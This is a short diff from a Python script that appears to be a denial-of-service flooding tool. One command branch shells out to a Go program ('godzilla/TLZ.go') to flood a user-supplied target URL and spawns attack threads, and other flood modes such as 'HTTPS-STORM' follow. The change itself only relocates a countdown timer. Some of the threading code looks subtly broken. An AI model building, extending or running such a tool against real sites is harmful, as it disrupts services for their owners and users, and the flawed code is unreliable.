@@ -1463,12 +1463,12 @@ def command():
             try :
                 os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
                 threading.Thread(target, args=(target, thread, methode, t)).start()
-                timer = threading.Thread(target=countdown, args=(t,))
-                timer.start()
-                timer.join()
             except IndexError:
                 print('coba cek dulu')
                 print('pelan pelan saja')
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
         
     elif command == "HTTPS-STORM" or command == "https-storm" :
         target, methode, thread, t = get_info_l72()
